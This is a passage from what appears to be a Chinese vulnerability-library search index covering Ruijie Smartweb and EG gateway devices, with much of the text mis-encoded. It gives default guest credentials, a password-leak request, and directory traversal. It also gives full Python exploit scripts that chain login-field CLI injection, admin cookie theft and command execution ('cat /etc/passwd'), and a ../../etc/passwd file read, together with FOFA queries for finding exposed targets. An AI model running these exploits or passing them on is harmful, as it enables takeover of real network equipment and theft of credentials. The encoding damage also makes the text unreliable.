http://xxx.xxx.xxx.xxx/cgi-bin/main.cgi?oper=showsvr&encode=GBK&username=liuw&sid=1&oper=showres ÁÇπÂáª‰∏™‰∫∫ËÆæÁΩÆË∑≥ËΩ¨È°µÈù¢Âç≥ÂèØ‰øÆÊîπË¥¶Âè∑‰ø°ÊÅØ ÂèÇËÄÉÊñáÁ´† https://mp.weixin.qq.com/s?__biz=MzU1NTkzMTYxOQ==&mid=2247484601&idx=1&sn=d6d6f4496243d98e688667faff137973 Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/ÈîêÊç∑/ÈîêÊç∑SmartwebÁÆ°ÁêÜÁ≥ªÁªü ÈªòËÆ§ÂºÄÂêØGuestË¥¶Êà∑ÊºèÊ¥û.html":{"url":"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/ÈîêÊç∑/ÈîêÊç∑SmartwebÁÆ°ÁêÜÁ≥ªÁªü ÈªòËÆ§ÂºÄÂêØGuestË¥¶Êà∑ÊºèÊ¥û.html","title":"ÈîêÊç∑SmartwebÁÆ°ÁêÜÁ≥ªÁªü ÈªòËÆ§ÂºÄÂêØGuestË¥¶Êà∑ÊºèÊ¥û","keywords":"","body":"ÈîêÊç∑SmartwebÁÆ°ÁêÜÁ≥ªÁªü ÈªòËÆ§ÂºÄÂêØGuestË¥¶Êà∑ÊºèÊ¥û CNVD-2020-56167 ÊºèÊ¥ûÊèèËø∞ ÈîêÊç∑SmartwebÁÆ°ÁêÜÁ≥ªÁªü ÈªòËÆ§ÂºÄÂêØGuestË¥¶Êà∑ÊºèÊ¥û ÔºåÊîªÂáªËÄÖÂèØ‰ª•ÈÄöËøáÊºèÊ¥ûÁôªÂΩïÂêéÂè∞Ëøõ‰∏ÄÊ≠•ÊîªÂáª ÊºèÊ¥ûÂΩ±Âìç [!NOTE] ÈîêÊç∑ÁΩëÁªúËÇ°‰ªΩÊúâÈôêÂÖ¨Âè∏ Êó†Á∫øsmartwebÁÆ°ÁêÜÁ≥ªÁªü FOFA [!NOTE] title=\"Êó†Á∫øsmartWeb--ÁôªÂΩïÈ°µÈù¢\" ÊºèÊ¥ûÂ§çÁé∞ ÁôªÂΩïÁöÑË¥¶Âè∑ÂØÜÁ†Å‰∏∫ guest/guest Goby & POC [!NOTE] Â∑≤‰∏ä‰º† https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC ÁõÆÂΩï‰∏≠ Ruijie smartweb weak password Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/ÈîêÊç∑/ÈîêÊç∑SmartwebÁÆ°ÁêÜÁ≥ªÁªü ÂØÜÁ†Å‰ø°ÊÅØÊ≥ÑÈú≤ÊºèÊ¥û.html":{"url":"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/ÈîêÊç∑/ÈîêÊç∑SmartwebÁÆ°ÁêÜÁ≥ªÁªü ÂØÜÁ†Å‰ø°ÊÅØÊ≥ÑÈú≤ÊºèÊ¥û.html","title":"ÈîêÊç∑SmartwebÁÆ°ÁêÜÁ≥ªÁªü ÂØÜÁ†Å‰ø°ÊÅØÊ≥ÑÈú≤ÊºèÊ¥û","keywords":"","body":"ÈîêÊç∑SmartwebÁÆ°ÁêÜÁ≥ªÁªü ÂØÜÁ†Å‰ø°ÊÅØÊ≥ÑÈú≤ÊºèÊ¥û ÊºèÊ¥ûÊèèËø∞ ÈîêÊç∑ÁΩëÁªúËÇ°‰ªΩÊúâÈôêÂÖ¨Âè∏Êó†Á∫øsmartwebÁÆ°ÁêÜÁ≥ªÁªüÂ≠òÂú®ÈÄªËæëÁº∫Èô∑ÊºèÊ¥ûÔºåÊîªÂáªËÄÖÂèØ‰ªéÊºèÊ¥ûËé∑ÂèñÂà∞ÁÆ°ÁêÜÂëòË¥¶Âè∑ÂØÜÁ†ÅÔºå‰ªéËÄå‰ª•ÁÆ°ÁêÜÂëòÊùÉÈôêÁôªÂΩï„ÄÇ ÊºèÊ¥ûÂΩ±Âìç [!NOTE] ÈîêÊç∑ÁΩëÁªúËÇ°‰ªΩÊúâÈôêÂÖ¨Âè∏ Êó†Á∫øsmartwebÁÆ°ÁêÜÁ≥ªÁªü FOFA [!NOTE] title=\"Êó†Á∫øsmartWeb--ÁôªÂΩïÈ°µÈù¢\" ÊºèÊ¥ûÂ§çÁé∞ ÁôªÂΩïÈ°µÈù¢Â¶Ç‰∏ã ÈªòËÆ§Â≠òÂú® guestË¥¶Êà∑ÔºåË¥¶Âè∑ÂØÜÁ†Å‰∏∫ guest/guest ÂÖ∂‰∏≠ÁôªÂΩïÁöÑËøáÁ®ã‰∏≠ÊêúÁ¥¢adminÁöÑÊï∞ÊçÆÂêéÂèëÁé∞ËØ∑Ê±Ç‰∫Ü‰∏Ä‰∏™Êñá‰ª∂ /web/xml/webuser-auth.xmlÔºåËÄå‰∏îÂìçÂ∫î‰∏≠ÂåÖÂê´‰∫Ü adminÂØÜÁ†ÅÁöÑbase64Âä†ÂØÜ Ëß£ÂØÜÂ∞±ÂèØ‰ª•Ëé∑Âæó adminÁÆ°ÁêÜÂëòÁöÑÂØÜÁ†ÅÔºåÂ∞ùËØïÁõ¥Êé•ËØ∑Ê±Ç http://xxx.xxx.xxx.xxx/web/xml/webuser-auth.xml CookieÊ∑ªÂä† Cookie: login=1; oid=1.3.6.1.4.1.4881.1.1.10.1.3; type=WS5302; auth=Z3Vlc3Q6Z3Vlc3Q%3D; user=guest Áõ¥Êé•Ëé∑ÂæóÊâÄÊúâÁöÑË¥¶Êà∑ÁöÑÁ≠âÁ∫ßÊ†áÂøóÂíåbase64Âä†ÂØÜÁöÑË¥¶Âè∑ÂØÜÁ†Å Goby & POC [!NOTE] Â∑≤‰∏ä‰º† https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC ÁõÆÂΩï‰∏≠ Ruijie_smartweb_password_information_disclosure Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/ÈîêÊç∑/ÈîêÊç∑‰∫ëËØæÂ†Ç‰∏ªÊú∫ ÁõÆÂΩïÈÅçÂéÜÊºèÊ¥û.html":{"url":"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/ÈîêÊç∑/ÈîêÊç∑‰∫ëËØæÂ†Ç‰∏ªÊú∫ ÁõÆÂΩïÈÅçÂéÜÊºèÊ¥û.html","title":"ÈîêÊç∑‰∫ëËØæÂ†Ç‰∏ªÊú∫ ÁõÆÂΩïÈÅçÂéÜÊºèÊ¥û","keywords":"","body":"ÈîêÊç∑‰∫ëËØæÂ†Ç‰∏ªÊú∫ ÁõÆÂΩïÈÅçÂéÜÊºèÊ¥û ÊºèÊ¥ûÊèèËø∞ ÈîêÊç∑‰∫ëËØæÂ†Ç‰∏ªÊú∫Â≠òÂú®ÁõÆÂΩïÈÅçÂéÜÊºèÊ¥ûÔºåÈÄöËøáËÆøÈóÆgetËØ∑Ê±Ç/pool/ÔºåÂç≥ÂèØËØªÂèñÁõÆÂΩï.ÂØºËá¥ÊïèÊÑü‰ø°ÊÅØÊ≥ÑÈú≤. ÊºèÊ¥ûÂΩ±Âìç [!NOTE] ÈîêÊç∑‰∫ëËØæÂ†Ç FOFA [!NOTE] title=\"Ruijie\" && \"‰∫ëËØæÂ†Ç‰∏ªÊú∫\" ÊºèÊ¥ûÂ§çÁé∞ ËÆøÈóÆ http://xxx.xxx.xxx.xxx/pool ÈÄ†ÊàêÁõÆÂΩïÈÅçÂéÜ Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/ÈîêÊç∑/ÈîêÊç∑EGÊòìÁΩëÂÖ≥ cli.php ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û.html":{"url":"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/ÈîêÊç∑/ÈîêÊç∑EGÊòìÁΩëÂÖ≥ cli.php ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û.html","title":"ÈîêÊç∑EGÊòìÁΩëÂÖ≥ cli.php ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û","keywords":"","body":"ÈîêÊç∑EGÊòìÁΩëÂÖ≥ cli.php ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û ÊºèÊ¥ûÊèèËø∞ ÈîêÊç∑EGÊòìÁΩëÂÖ≥ cli.phpÂ≠òÂú®ÂëΩ‰ª§ÊâßË°åÊºèÊ¥ûÔºåÈÖçÂêà ÈîêÊç∑EGÊòìÁΩëÂÖ≥ ÁÆ°ÁêÜÂëòË¥¶Âè∑ÂØÜÁ†ÅÊ≥ÑÈú≤ÊºèÊ¥û ËææÂà∞RCEÊéßÂà∂ÊúçÂä°Âô® ÊºèÊ¥ûÂΩ±Âìç [!NOTE] ÈîêÊç∑EGÊòìÁΩëÂÖ≥ FOFA [!NOTE] app=\"Ruijie-EGÊòìÁΩëÂÖ≥\" ÊºèÊ¥ûÂ§çÁé∞ È¶ñÂÖàÁôªÂΩïÂà∞ÂêéÂè∞‰∏≠(ÂèØ‰ª•ÁªÑÂêà ÈîêÊç∑EGÊòìÁΩëÂÖ≥ ÁÆ°ÁêÜÂëòË¥¶Âè∑ÂØÜÁ†ÅÊ≥ÑÈú≤ÊºèÊ¥û) ÊºèÊ¥ûÊñá‰ª∂ cli.php true, \"data\" => $content); json_echo($data); } /** * Ëé∑ÂèñÁ≥ªÁªüÊó∂Èó¥ */ public function dateAction() { setTimeZone(); $data['status'] = true; $data[\"data\"][\"time\"] = date(\"Y-m-d H:i:s\"); $data[\"data\"][\"zone\"] = \"UTC\" . getTimeZone(); json_echo($data); } /** * Ëé∑ÂèñÁ≥ªÁªüÊó∂Âå∫ */ public function datezoneAction() { $data['status'] = true; $data[\"data\"] = getTimeZone(); json_echo($data); } /** * Ê£ÄÊµãÈùôÊÄÅÈ°µÈù¢Êó∂ÂÄôÊú™ÁôªÂΩïÁõ¥Êé•ËøõÂÖ• */ public function checkloginAction() { json_echo(array(\"status\" => true)); } } include_once(AROOT . \"init.php\"); //mvcÂàùÂßãÂåñÂÖ•Âè£ÔºåÊîæÂú®Â∫ïÈÉ® ÂÖ≥ÈîÆÈÉ®ÂàÜ‰ª£Á†Å‰∏∫ /** * ÊâßË°åshellËÑöÊú¨ */ public function shellAction() { $command = p(\"command\"); if ($command == false) { $data[\"status\"] = 2; $data[\"msg\"] = \"no command\"; json_echo($data); exit(); } $content = []; exec(EscapeShellCmd($command), $content); $data = array(\"status\" => true, \"data\" => $content); json_echo($data); } commandÂèÇÊï∞Áõ¥Êé•‰º†ÂÖ•ÊâßË°å‰∫ÜÂëΩ‰ª§ ÂèëÈÄÅËØ∑Ê±ÇÂåÖ POST /cli.php?a=shell HTTP/1.1 Host: User-Agent: Go-http-client/1.1 Content-Length: 24 Content-Type: application/x-www-form-urlencoded Cookie: RUIJIEID=nk5erth9i0pvcco3n7fbpa9bi0;user=admin; X-Requested-With: XMLHttpRequest Accept-Encoding: gzip notdelay=true&command=id ÊºèÊ¥ûPOC #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import base64 import requests import random import re import json import sys def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34mÂÖ¨‰ºóÂè∑ : PeiQiÊñáÂ∫ì \\033[0m') print('+ \\033[34mVersion: ÈîêÊç∑EGÁΩëÂÖ≥ cli.php RCE \\033[0m') print('+ \\033[36m‰ΩøÁî®Ê†ºÂºè: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/login.php\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\" } data = 'username=admin&password=admin?show+webmaster+user' try: response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=10) print(\"\\033[36m[o] Ê≠£Âú®ÊâßË°å show webmaster user \\033[0m\".format(target_url)) if \"data\" in response.text and response.status_code == 200: password = re.findall(r'admin (.*?)\"', response.text)[0] print(\"\\033[36m[o] ÊàêÂäüËé∑Âèñ, Ë¥¶Âè∑ÂØÜÁ†Å‰∏∫: admin {} \\033[0m\".format(password)) POC_2(target_url, password) except Exception as e: print(\"\\033[31m[x] ËØ∑Ê±ÇÂ§±Ë¥•:{} \\033[0m\".format(e)) sys.exit(0) def POC_2(target_url, password): vuln_url = target_url + \"/login.php\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\" } data = 'username=admin&password={}'.format(password) try: response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=10) print(\"\\033[36m[o] Ê≠£Âú®ÁôªÂΩï..... \\033[0m\".format(target_url)) if \"status\" in response.text and \"1\" in response.text and response.status_code == 200: ruijie_cookie = \"RUIJIEID=\" + re.findall(r\"'Set-Cookie': 'RUIJIEID=(.*?);\", str(response.headers))[0] + \";user=admin;\" print(\"\\033[36m[o] ÊàêÂäüËé∑ÂèñÁÆ°ÁêÜÂëòCookie: {} \\033[0m\".format(ruijie_cookie)) POC_3(target_url, ruijie_cookie) except Exception as e: print(\"\\033[31m[x] ËØ∑Ê±ÇÂ§±Ë¥•:{} \\033[0m\".format(e)) sys.exit(0) def POC_3(target_url, ruijie_cookie): vuln_url = target_url + \"/cli.php?a=shell\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\", \"Cookie\": \"{}\".format(ruijie_cookie) } data = 'notdelay=true&command=cat /etc/passwd' try: response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=10) print(\"\\033[36m[o] Ê≠£Âú®ÊâßË°å cat /etc/passwd..... \\033[0m\".format(target_url)) if \"root:\" in response.text and response.status_code == 200: print(\"\\033[36m[o] ÊàêÂäüËØªÂèñ /etc/passwd \\n[o] ÂìçÂ∫î‰∏∫:{} \\033[0m\".format(response.text)) except Exception as e: print(\"\\033[31m[x] ËØ∑Ê±ÇÂ§±Ë¥•:{} \\033[0m\".format(e)) sys.exit(0) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/ÈîêÊç∑/ÈîêÊç∑EGÊòìÁΩëÂÖ≥ ÁÆ°ÁêÜÂëòË¥¶Âè∑ÂØÜÁ†ÅÊ≥ÑÈú≤ÊºèÊ¥û.html":{"url":"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/ÈîêÊç∑/ÈîêÊç∑EGÊòìÁΩëÂÖ≥ ÁÆ°ÁêÜÂëòË¥¶Âè∑ÂØÜÁ†ÅÊ≥ÑÈú≤ÊºèÊ¥û.html","title":"ÈîêÊç∑EGÊòìÁΩëÂÖ≥ ÁÆ°ÁêÜÂëòË¥¶Âè∑ÂØÜÁ†ÅÊ≥ÑÈú≤ÊºèÊ¥û","keywords":"","body":"ÈîêÊç∑EGÊòìÁΩëÂÖ≥ ÁÆ°ÁêÜÂëòË¥¶Âè∑ÂØÜÁ†ÅÊ≥ÑÈú≤ÊºèÊ¥û ÊºèÊ¥ûÊèèËø∞ ÈîêÊç∑EGÊòìÁΩëÂÖ≥ login.phpÂ≠òÂú® CLIÂëΩ‰ª§Ê≥®ÂÖ•ÔºåÂØºËá¥ÁÆ°ÁêÜÂëòË¥¶Âè∑ÂØÜÁ†ÅÊ≥ÑÈú≤ÊºèÊ¥û ÊºèÊ¥ûÂΩ±Âìç [!NOTE] ÈîêÊç∑EGÊòìÁΩëÂÖ≥ FOFA [!NOTE] app=\"Ruijie-EGÊòìÁΩëÂÖ≥\" ÊºèÊ¥ûÂ§çÁé∞ ÁôªÂΩïÈ°µÈù¢Â¶Ç‰∏ã ÊºèÊ¥ûÊñá‰ª∂ login.php 1 || count(preg_split($reg, $password)) > 1) { $data[\"status\"] = 6; $data[\"msg\"] = \"username or password can't exist '\\r\\n'\"; json_echo($data); exit(); } if ($username == FALSE || $password == FALSE) { $data[\"status\"] = 5; $data[\"msg\"] = \"username or password can't empty\"; json_echo($data); exit(); } $res = execCli(\"exec\", \"webmaster $username $password\"); if ($res[\"status\"] != 1) { json_echo($res); exit(); } $isSuccess = trim($res[\"data\"]); if ($isSuccess == 0) { //Áî®Êà∑Âêç„ÄÅË¥¶Âè∑È™åËØÅÊàêÂäü session_start(); $_SESSION['username'] = $username; //ËÆ∞ÂΩïÁî®Êà∑Âêç $_SESSION[\"lasttime\"] = time(); //ËÆ∞ÂΩïÁôªÂΩïÊó∂Èó¥ $config = @file_get_contents(DS . \"data\" . DS . \"web.config\"); //Ëé∑ÂèñwebÈÖçÁΩÆ‰ø°ÊÅØ if ($config != false) { $config = unserialize($config); $_SESSION[\"timeout\"] = isset($config[\"loginTimeout\"]) ? $config[\"loginTimeout\"] * 60 : c(\"timeout\"); } else { $_SESSION[\"timeout\"] = c(\"timeout\"); } setcookie(\"user\", $_SESSION['username']); } $res[\"data\"] = $isSuccess; json_echo($res); } /** * Ëé∑ÂèñËÆæÂ§á‰ø°ÊÅØ */ function versionAction() { $info = $version = execCli(\"exec\", \"show version detail\", \"\"); $info[\"data\"] = preg_split(\"/\\r*\\n/\", $info[\"data\"]); json_echo($info); } } include_once(AROOT . \"init.php\"); //mvcÂàùÂßãÂåñÂÖ•Âè£ÔºåÊîæÂú®Â∫ïÈÉ® ÂÖ≥ÈîÆ‰ª£Á†ÅÈÉ®ÂàÜ if ($username == FALSE || $password == FALSE) { $data[\"status\"] = 5; $data[\"msg\"] = \"username or password can't empty\"; json_echo($data); exit(); } $res = execCli(\"exec\", \"webmaster $username $password\"); if ($res[\"status\"] != 1) { json_echo($res); exit(); } $isSuccess = trim($res[\"data\"]); ÂèëÈÄÅËØ∑Ê±ÇÂåÖÔºåÊãºÊé• CLIÊåá‰ª§ show webmaster user POST /login.php HTTP/1.1 Host: User-Agent: Go-http-client/1.1 Content-Length: 49 Content-Type: application/x-www-form-urlencoded X-Requested-With: XMLHttpRequest Accept-Encoding: gzip username=admin&password=admin?show+webmaster+user ÊàêÂäüËé∑ÂèñË¥¶Âè∑ÂØÜÁ†Å ÊºèÊ¥ûPOC #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import base64 import requests import random import re import json import sys def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34mÂÖ¨‰ºóÂè∑ : PeiQiÊñáÂ∫ì \\033[0m') print('+ \\033[34mVersion: ÈîêÊç∑EGÁΩëÂÖ≥ ÁÆ°ÁêÜÂëòË¥¶Âè∑ÂØÜÁ†ÅÊ≥ÑÈú≤ \\033[0m') print('+ \\033[36m‰ΩøÁî®Ê†ºÂºè: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/login.php\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\" } data = 'username=admin&password=admin?show+webmaster+user' try: response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=10) print(\"\\033[36m[o] Ê≠£Âú®ÊâßË°å show webmaster user \\033[0m\".format(target_url)) if \"data\" in response.text and response.status_code == 200: print(\"\\033[36m[o] ÊàêÂäüËé∑Âèñ, ÂìçÂ∫î‰∏∫:{} \\033[0m\".format(response.text)) except Exception as e: print(\"\\033[31m[x] ËØ∑Ê±ÇÂ§±Ë¥•:{} \\033[0m\".format(e)) sys.exit(0) # if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/ÈîêÊç∑/ÈîêÊç∑EGÊòìÁΩëÂÖ≥ branch_passw.php ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û.html":{"url":"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/ÈîêÊç∑/ÈîêÊç∑EGÊòìÁΩëÂÖ≥ branch_passw.php ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û.html","title":"ÈîêÊç∑EGÊòìÁΩëÂÖ≥ branch_passw.php ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û","keywords":"","body":"ÈîêÊç∑EGÊòìÁΩëÂÖ≥ branch_passw.php ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:50:07 "},"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/ÈîêÊç∑/ÈîêÊç∑EGÊòìÁΩëÂÖ≥ download.php ‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥û.html":{"url":"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/ÈîêÊç∑/ÈîêÊç∑EGÊòìÁΩëÂÖ≥ download.php ‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥û.html","title":"ÈîêÊç∑EGÊòìÁΩëÂÖ≥ download.php ‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥û","keywords":"","body":"ÈîêÊç∑EGÊòìÁΩëÂÖ≥ download.php ÂêéÂè∞‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥û ÊºèÊ¥ûÊèèËø∞ ÈîêÊç∑EGÊòìÁΩëÂÖ≥ download.php Â≠òÂú®ÂêéÂè∞‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥ûÔºåÂØºËá¥ÂèØ‰ª•ËØªÂèñÊúçÂä°Âô®‰ªªÊÑèÊñá‰ª∂ ÊºèÊ¥ûÂΩ±Âìç [!NOTE] ÈîêÊç∑EGÊòìÁΩëÂÖ≥ FOFA [!NOTE] app=\"Ruijie-EGÊòìÁΩëÂÖ≥\" ÊºèÊ¥ûÂ§çÁé∞ È¶ñÂÖàÁôªÂΩïÂà∞ÂêéÂè∞‰∏≠(ÂèØ‰ª•ÁªÑÂêà ÈîêÊç∑EGÊòìÁΩëÂÖ≥ ÁÆ°ÁêÜÂëòË¥¶Âè∑ÂØÜÁ†ÅÊ≥ÑÈú≤ÊºèÊ¥û) ÊºèÊ¥ûÊñá‰ª∂ download.php _checkfile(iconv(\"UTF-8\", \"GB2312\",$filepath)); if ($filepointer !== false) { if (headers_sent()) { $this->error = \"Êó†Ê≥ï‰∏ãËΩΩÊñá‰ª∂ÔºåÂ∑≤ÁªèËæìÂá∫ÂÖ∂‰ªñËØ∑Ê±ÇÂ§¥ÔºÅ\"; } else { header(\"Pragma: public\"); header(\"Expires: 0\"); header(\"Cache-Control: must-revalidate, post-check=0, pre-check=0\"); header(\"Cache-Control: private\", false); header(\"Content-Type: {$this->_getMimeType($filename)}\"); header(\"Content-Disposition: attachment; filename=\\\"{$filename}\\\";\"); header(\"Content-Transfer-Encoding: binary\"); header(\"Content-Length: {$this->_getFileSize($filepointer)}\"); @ob_clean(); rewind($filepointer); fpassthru($filepointer); exit(); } } if ($this->error) { //ÊúâÈîôËØØ‰∫ßÁîü ?> Êñá‰ª∂‰∏ãËΩΩÂ§±Ë¥• alert(\"error; ?>\"); true, \"data\" => $fileContent); json_echo($data); } } /** * Êñá‰ª∂Ê£ÄÊü• */ private function _checkfile($filename) { if ($filename == false) { $this->error = \"ËØ∑ÊåáÂÆöË¶Å‰∏ãËΩΩÁöÑÊñá‰ª∂ÔºÅ\"; return FALSE; } $isallow = false; foreach ($this->allow as $pattern) { if (preg_match($pattern, $filename)) { $isallow = true; break; } } if (!$isallow) { $this->error = \"ËØ•Êñá‰ª∂‰∏çÂÖÅËÆ∏‰∏ãËΩΩÔºÅ\"; return FALSE; } if (!is_file($filename)) { $this->error = \"ËØ•Êñá‰ª∂‰∏çÂ≠òÂú®ÔºÅ\"; return FALSE; } else if (!is_readable($filename)) { //if (system(\"chmod +r \" . escapeshellarg($filename))) { $this->error = \"Êó†Ê≥ï‰∏ãËΩΩËØ•Êñá‰ª∂ÔºåÊ≤°ÊúâÊùÉÈôêÔºÅ\"; return FALSE; //} } return fopen($filename, \"rb\"); } /** * Ëé∑ÂèñÊñá‰ª∂mimeÁ±ªÂûã * @param string $fileName Êñá‰ª∂Âêç * @return string */ private function _getMimeType($fileName) { $charset = v(\"charset\"); switch (pathinfo($fileName, PATHINFO_EXTENSION)) { case \"pdf\": return \"application/pdf\"; case \"exe\": return \"application/octet-stream\"; case \"zip\": return \"application/zip\"; case \"doc\": return \"application/msword\"; case \"xls\": return \"application/vnd.ms-excel\"; case \"ppt\": return \"application/vnd.ms-powerpoint\"; case \"gif\": return \"image/gif\"; case \"png\": return \"image/png\"; case \"jpeg\": case \"jpg\": return \"image/jpg\"; case \"htm\": return \"text/html;charset=gbk\"; case \"html\": if(!$charset) { return \"text/html;charset=gbk\"; }else { return \"text/html;charset=UTF-8\"; } default: return \"application/force-download\"; } } /** * Ëé∑ÂèñÊñá‰ª∂Â§ßÂ∞è * @return int */ private function _getFileSize($filePointer) { $stat = fstat($filePointer); return $stat['size']; } } include_once AROOT.'init.php'; //mvcÂàùÂßãÂåñÂÖ•Âè£ÔºåÊîæÂú®Â∫ïÈÉ® ÂÖ≥ÈîÆ‰ª£Á†Å‰∏∫ /** * ËØªÂèñÊñáÊú¨Êñá‰ª∂ÂÜÖÂÆπÔºåÊîØÊåÅajaxËØ∑Ê±Ç */ public function read_txtAction() { $filename = v(\"file\"); if (!file_exists($filename)) { $data[\"status\"] = 2; $data[\"msg\"] = $filename . \"‰∏çÂ≠òÂú®\"; json_echo($data); exit(); } else { $fileContent = file_get_contents($filename); $data = array(\"status\" => true, \"data\" => $fileContent); json_echo($data); } } Áõ¥Êé•‰ªéGetËØ∑Ê±Ç‰∏≠ÊèêÂèñ fileÂèÇÊï∞ËØªÂèñÊñá‰ª∂ÔºåÂèØ‰ª•‰ΩøÁî® ../ Ë∑≥ËΩ¨ÁõÆÂΩï È™åËØÅPOC /download.php?a=read_txt&file=../../../../etc/passwd ÊºèÊ¥ûPOC #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import base64 import requests import random import re import json import sys def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34mÂÖ¨‰ºóÂè∑ : PeiQiÊñáÂ∫ì \\033[0m') print('+ \\033[34mVersion: ÈîêÊç∑EGÁΩëÂÖ≥ cli.php RCE \\033[0m') print('+ \\033[36m‰ΩøÁî®Ê†ºÂºè: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/login.php\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\" } data = 'username=admin&password=admin?show+webmaster+user' try: response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=10) print(\"\\033[36m[o] Ê≠£Âú®ÊâßË°å show webmaster user \\033[0m\".format(target_url)) if \"data\" in response.text and response.status_code == 200: password = re.findall(r'admin (.*?)\"', 